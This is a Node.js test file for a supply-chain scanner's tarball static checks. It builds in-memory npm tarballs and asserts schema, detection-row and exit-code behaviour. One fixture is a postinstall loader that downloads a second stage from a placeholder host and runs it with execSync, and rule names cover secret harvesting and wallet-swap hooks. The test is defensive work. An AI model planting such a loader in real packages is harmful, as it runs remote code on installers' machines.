// 0.1.5 tarball static checks, step 5 (design note §5 "chaingate check (CI)", pulled forward from 0.1.6 by the operator 2026-10-14):
// `chaingate check <pkg>@<ver> --packument <file> --tarball <file>` reuses the walker (step 1), the checks (step 2) and MC offline over a
// LOCAL tarball and REPORTS the rows in a `tarball` member of a `chaingate.check/4` record -- /3 plus exactly that optional member; a
// check without --tarball still writes /3, byte for byte (against a 1.0 or 1.1 seed; a check against
// a 1.2 seed always writes /4, whose placement enum adds new-family-cold-start). The tarball rows never change `decision`, `effective` or the exit code in
// 0.1.5 (the CI consumer's invariant effective.action == decision.disposition holds; gating on `tarball.disposition` is a consumer's
// choice and an operator ruling). Written failing-first against the step-3 tree. Nothing is installed or run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createHash } from 'node:crypto';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { parseArgs, runCheck, USAGE } from '../../cli/commands/check.js';
import { buildCheckRecord, inputFromPackument, SUPPORTED_RECORDS, recordCompatibility } from '../../cli/check-record.js';
import { validateRecord } from '../../examples/ci/chaingate-ci.mjs';
import { explain } from '../../seed/v3/explain.js';
import { explainSaved } from '../../cli/commands/why.js';
import { buildSeed, openFixtureSeed, docFor, after, WARNCFG, manifestFor } from '../seed-v3/u05-fixtures.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const V3 = path.join(HERE, '..', '..', 'seed', 'v3');
const S3 = path.join(V3, 'chaingate-check-3.schema.json'); const S4 = path.join(V3, 'chaingate-check-4.schema.json');
const S5 = path.join(V3, 'chaingate-check-5.schema.json');   // what 0.1.6 writes
const FINDING = path.join(HERE, '..', 'fixtures', 'cft03', 'finding.schema.json');
const read = (p) => JSON.parse(fs.readFileSync(p, 'utf8'));
const TOOL = { name: 'chaingate', version: 'test' };
let Ajv2020 = null; try { Ajv2020 = createRequire(import.meta.url)('ajv/dist/2020.js'); } catch { /* not installed */ }

function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://cdn.example.invalid/stage2", (r) => { let b = ""; r.on("data", (c) => { b += c; }); r.on("end", () => cp.execSync(b)); });\n';

/** p@1.3.0 after the seeded tip: a hookless registry manifest with main index.js; the tarball decides what the rows say. */
function world(dir, { tarballFiles, manifest = { ...manifestFor('p', '1.3.0'), main: 'index.js' } }) {
  const doc = docFor('p', [['1.3.0', after(), manifest]]);
  const pk = path.join(dir, 'p.json'); fs.writeFileSync(pk, JSON.stringify(doc));
  const tb = path.join(dir, 'p-1.3.0.tgz'); fs.writeFileSync(tb, tgz(tarballFiles));
  return { doc, pk, tb };
}
const TARBALL_DEF = {
  type: 'object', additionalProperties: false, required: ['source', 'static_checks_version', 'walk', 'keep_list', 'rows', 'disposition'],
  properties: {
    source: { type: 'object', additionalProperties: false, required: ['kind', 'path', 'sha256', 'bytes'],
      properties: { kind: { const: 'tarball-file' }, path: { type: 'string', minLength: 1 }, sha256: { type: 'string', pattern: '^[0-9a-f]{64}$' }, bytes: { type: 'integer', minimum: 0 } } },
    static_checks_version: { type: 'string', minLength: 1 },
    walk: { type: 'object', additionalProperties: false, required: ['ok'], properties: { ok: { type: 'boolean' }, reason: { type: 'string' } } },
    keep_list: { type: 'object', additionalProperties: false, required: ['source', 'candidates'],
      properties: { source: { enum: ['registry manifest', 'tarball package.json'] }, candidates: { type: 'integer', minimum: 0 } } },
    rows: { type: 'array', minItems: 1, items: { $ref: '#/$defs/result_row' } },
    disposition: { enum: ['ALLOW', 'WARN', 'SKIP'] },
  },
};

test('V4 /4 equals /3 plus exactly the documented delta: the schema const, an optional `tarball` member on the evaluated and refused shapes, its definition, and the placement new-family-cold-start', () => {
  const want = read(S3); const got = read(S4);
  want.$id = 'https://chaingate.dev/schemas/chaingate-check-4.json';
  for (const shape of want.oneOf) { shape.properties.schema.const = 'chaingate.check/4'; if (shape.properties.result.const !== 'tool_error') shape.properties.tarball = { $ref: '#/$defs/tarball' }; }
  want.$defs.tarball = TARBALL_DEF;
  // operator 2026-10-18: rl2 placement's new-family-cold-start (seed contract 1.2) is a /4 value, after new-major-cold-start
  const addKind = (o) => { if (Array.isArray(o)) { const i = o.indexOf('new-major-cold-start'); if (i >= 0) o.splice(i + 1, 0, 'new-family-cold-start'); o.forEach(addKind); }
    else if (o && typeof o === 'object') Object.values(o).forEach(addKind); };
  addKind(want);
  want.title = got.title; want.description = got.description;   // prose may name /4; nothing else may differ
  assert.deepEqual(got, want);
  assert.equal(createHash('sha256').update(fs.readFileSync(S3)).digest('hex'), createHash('sha256').update(fs.readFileSync(S3)).digest('hex'), '/3 untouched (its own test pins the bytes)');
});

test('V4b the supported combinations: /4 carries /3\'s versions plus seed contract 1.2; the explanation renderer and the CI consumer accept /4', () => {
  const { seed_contract_versions: c3, ...rest3 } = SUPPORTED_RECORDS['chaingate.check/3'];
  const { seed_contract_versions: c4, ...rest4 } = SUPPORTED_RECORDS['chaingate.check/4'];
  assert.deepEqual(rest4, rest3); assert.deepEqual(c4, [...c3, 'cft-seed-v3-contract-1.2']);
  assert.ok(Object.keys(SUPPORTED_RECORDS).includes('chaingate.check/4'));
});

test('A1 parseArgs: --tarball <file> is accepted beside --packument; without a file it is an error; the usage names it', () => {
  const o = parseArgs(['p@1.3.0', '--packument', 'p.json', '--tarball', 'p.tgz', '--json']);
  assert.equal(o.tarball, 'p.tgz'); assert.equal(o.packument, 'p.json'); assert.equal(o.json, true); assert.deepEqual(o.errors, []);
  assert.ok(parseArgs(['p@1.3.0', '--packument', 'p.json', '--tarball']).errors.some((e) => /--tarball needs a file/.test(e)));
  assert.equal(parseArgs(['p@1.3.0', '--packument', 'p.json']).tarball, null);
  assert.match(USAGE, /--tarball <file>/);
});

function env(dir, seedDb) {
  return { ...process.env, CHAINGATE_HOME: dir, CHAINGATE_SEED_V3: seedDb, CHAINGATE_SEED_V3_TRUST: 'unsigned-development',
    CHAINGATE_POLICY_ON_UNUSABLE_INPUT: 'WARN', CHAINGATE_POLICY_ON_NO_EVIDENCE: 'WARN', CHAINGATE_WITNESS_DB: path.join(dir, 'w.db') };
}

test('R1 without --tarball the record is today\'s /5 (0.1.5: /3), member for member; with --tarball it is the same schema with the tarball member and nothing else changed', async () => {
  const s = buildSeed({ layout: '1.1' }); const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s5-'));
  try {
    const w = world(dir, { tarballFiles: { 'package.json': JSON.stringify({ name: 'p', version: '1.3.0', main: 'index.js' }), 'index.js': 'module.exports = 1;\n' } });
    const plain = await runCheck({ name: 'p', version: '1.3.0', packument: w.pk, env: env(dir, s.dbPath), cwd: dir });
    assert.equal(plain.record.schema, 'chaingate.check/5'); assert.equal(plain.record.result, 'evaluated'); assert.ok(!('tarball' in plain.record));   // since 0.1.6
    const withT = await runCheck({ name: 'p', version: '1.3.0', packument: w.pk, tarball: w.tb, env: env(dir, s.dbPath), cwd: dir });
    const r = withT.record;
    assert.equal(r.schema, 'chaingate.check/5'); assert.equal(withT.exit, plain.exit, 'the exit code follows effective.action, which the tarball never changes');
    const { tarball, schema, ...rest } = r; const { schema: s3, ...plainRest } = plain.record;
    assert.deepEqual(rest, plainRest, 'every other member is byte-identical to the /3 record');
    assert.equal(tarball.source.kind, 'tarball-file'); assert.equal(tarball.source.path, w.tb);
    assert.equal(tarball.source.sha256, createHash('sha256').update(fs.readFileSync(w.tb)).digest('hex')); assert.equal(tarball.source.bytes, fs.statSync(w.tb).size);
    assert.equal(tarball.static_checks_version, 'static-checks-1.9');   // declared: recon's static-checks-1.5 mirrored (R5, R9), then 1.6 facts only (R11), 1.7 bound-module sinks, 1.8 S8 and S9
    assert.deepEqual(tarball.walk, { ok: true });
    assert.deepEqual(tarball.keep_list, { source: 'registry manifest', candidates: 5 });
    assert.deepEqual(tarball.rows.map((x) => x.gate), ['install-manifest-mismatch', 'static:S0-shell-fetch-in-hook', 'static:S1-loader-in-hook-target', 'static:S2-obfuscated-entry', 'static:S3-secret-harvest-with-sink', 'static:S4-wallet-swap-hook', 'static:S5-oversized-hook-target',
      'static:S6-network-beacon-in-hook-target', 'static:S7-entry-capability-gain', 'static:S8-prebuilt-addon-dropper-in-hook', 'static:S9-hidden-script-in-gyp-build']);   // S6, S7: rulings R2, R3 2026-10-21; S8, S9: static-checks-1.8 (declared)
    assert.equal(tarball.rows[0].result, 'ALLOW'); assert.equal(tarball.rows[3].result, 'ALLOW'); assert.match(tarball.rows[3].detail, /^entry files carry no obfuscation marker pair \(1 file read\); armed by chaingate check --tarball$/);
    assert.equal(tarball.disposition, 'ALLOW');
    assert.deepEqual(validateRecord(r), [], 'the CI consumer accepts a /4 record'); assert.deepEqual(recordCompatibility(r), []);
    assert.deepEqual(explain(r).text, explain(plain.record).text, 'the explanation is the seed decision\'s, unchanged');
    const saved = path.join(dir, 'rec.json'); fs.writeFileSync(saved, JSON.stringify(r)); assert.ok(explainSaved(saved).explanation, 'why --from reads a /4 record');
    if (Ajv2020) {
      const Ctor = Ajv2020.default || Ajv2020; const ajv = new Ctor({ strict: true, strictRequired: false, allErrors: true }); ajv.addSchema(read(FINDING));
      const v4 = ajv.compile(read(S4)); const v3 = ajv.compile(read(S3)); const v5 = ajv.compile(read(S5));
      // since 0.1.6 both records are /5; the 0.1.5 shapes hold for the same records relabelled (no re-tier member here)
      assert.ok(v5(r), JSON.stringify(v5.errors)); assert.ok(v5(plain.record), JSON.stringify(v5.errors));
      assert.ok(!('retier' in r.decision) && !('retier' in plain.record.decision));
      assert.ok(v4({ ...r, schema: 'chaingate.check/4' }), JSON.stringify(v4.errors)); assert.equal(v3({ ...r, schema: 'chaingate.check/3' }), false, 'a tarball member is not /3');
      assert.ok(v3({ ...plain.record, schema: 'chaingate.check/3' }), JSON.stringify(v3.errors));
    }
  } finally { s.cleanup(); fs.rmSync(dir, { recursive: true, force: true }); }
});

test('R2 a loader in the hook target and a tarball package.json that adds a hook: S1 NOTE (contributing), MC WARN, tarball.disposition WARN -- decision, effective and exit untouched', async () => {
  const s = buildSeed({ layout: '1.1' }); const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s5-'));
  try {
    const w = world(dir, { tarballFiles: { 'package.json': JSON.stringify({ name: 'p', version: '1.3.0', main: 'index.js', scripts: { postinstall: 'node install.js' } }), 'install.js': LOADER, 'index.js': 'module.exports = 1;\n' } });
    const plain = await runCheck({ name: 'p', version: '1.3.0', packument: w.pk, env: env(dir, s.dbPath), cwd: dir });
    const { record: r, exit } = await runCheck({ name: 'p', version: '1.3.0', packument: w.pk, tarball: w.tb, env: env(dir, s.dbPath), cwd: dir });
    const row = (g) => r.tarball.rows.find((x) => x.gate.startsWith(g));
    assert.equal(row('install-manifest-mismatch').result, 'WARN'); assert.match(row('install-manifest-mismatch').detail, /declares postinstall; the registry entry declares no install hook/);
    assert.equal(row('static:S1').result, 'NOTE', 'contributing: a WARN is recorded as NOTE');
    assert.equal(row('static:S1').detail, 'hook target install.js (211 B) has a network sink (http-request, url-literal) and an execution sink (child_process); armed by chaingate check --tarball');
    assert.equal(r.tarball.disposition, 'WARN');
    assert.deepEqual(r.decision, plain.record.decision); assert.deepEqual(r.effective, plain.record.effective); assert.equal(exit, plain.exit);
    assert.deepEqual(validateRecord(r), []);
  } finally { s.cleanup(); fs.rmSync(dir, { recursive: true, force: true }); }
});

test('R3 a tarball that is not a gzip archive: the walk is stated, every row "not checked", disposition SKIP; an unreadable file is a tool error', async () => {
  const s = buildSeed({ layout: '1.1' }); const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s5-'));
  try {
    const w = world(dir, { tarballFiles: { 'package.json': '{}' } }); fs.writeFileSync(w.tb, 'not a gzip archive');
    const { record: r, exit } = await runCheck({ name: 'p', version: '1.3.0', packument: w.pk, tarball: w.tb, env: env(dir, s.dbPath), cwd: dir });
    assert.equal(r.schema, 'chaingate.check/5'); assert.equal(r.tarball.walk.ok, false); assert.match(r.tarball.walk.reason, /gunzip/);
    for (const x of r.tarball.rows) { assert.equal(x.result, 'SKIP'); assert.match(x.detail, /^not checked: gunzip/); }
    assert.equal(r.tarball.disposition, 'SKIP'); assert.deepEqual(validateRecord(r), []); assert.equal(exit, 3, 'the recorded advisory pin on p@1.3.0 decides (BLOCK), exactly as without a tarball');   // corrected after the failing-first record: the fixture pins p@1.3.0
    const missing = await runCheck({ name: 'p', version: '1.3.0', packument: w.pk, tarball: path.join(dir, 'nope.tgz'), env: env(dir, s.dbPath), cwd: dir });
    assert.equal(missing.record.result, 'tool_error'); assert.equal(missing.record.error.code, 'tarball_unreadable'); assert.equal(missing.exit, 4);
    assert.deepEqual(validateRecord(missing.record), []);
  } finally { s.cleanup(); fs.rmSync(dir, { recursive: true, force: true }); }
});

test('R4 a version the packument does not carry: the check is refused as today, and the tarball\'s own package.json is the keep list\'s source (stated)', async () => {
  const s = buildSeed({ layout: '1.1' }); const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s5-'));
  try {
    const doc = docFor('p'); const pk = path.join(dir, 'p.json'); fs.writeFileSync(pk, JSON.stringify(doc));
    const tb = path.join(dir, 'p-9.9.9.tgz'); fs.writeFileSync(tb, tgz({ 'package.json': JSON.stringify({ name: 'p', version: '9.9.9', main: 'lib/main.js' }), 'lib/main.js': 'module.exports = 1;\n' }));
    const { record: r } = await runCheck({ name: 'p', version: '9.9.9', packument: pk, tarball: tb, env: env(dir, s.dbPath), cwd: dir });
    assert.equal(r.result, 'refused'); assert.equal(r.schema, 'chaingate.check/5');
    assert.deepEqual(r.tarball.keep_list, { source: 'tarball package.json', candidates: 5 });
    assert.equal(r.tarball.rows[0].result, 'SKIP'); assert.equal(r.tarball.rows[0].detail, 'not checked: no registry manifest at hand');
    assert.equal(r.tarball.rows.find((x) => x.gate.startsWith('static:S2')).result, 'ALLOW');
    assert.deepEqual(validateRecord(r), []); assert.deepEqual(recordCompatibility(r), []);
  } finally { s.cleanup(); fs.rmSync(dir, { recursive: true, force: true }); }
});

test('R5 buildCheckRecord alone writes /5 since 0.1.6 (0.1.5: /3), with no tarball member', () => {
  const s = buildSeed({ layout: '1.1' }); const seed = openFixtureSeed(s.dbPath);
  try {
    const doc = docFor('p', [['1.3.0', after(), null]]);
    const rec = buildCheckRecord({ seed, policy: WARNCFG, domainVersionCount: 'from-packument', input: inputFromPackument(doc, 'p', '1.3.0'), request: { package: 'p', version: '1.3.0' }, tool: TOOL });
    assert.equal(rec.schema, 'chaingate.check/5'); assert.ok(!('tarball' in rec));   // since 0.1.6 (0.1.5: /3)
  } finally { seed.close(); s.cleanup(); }
});
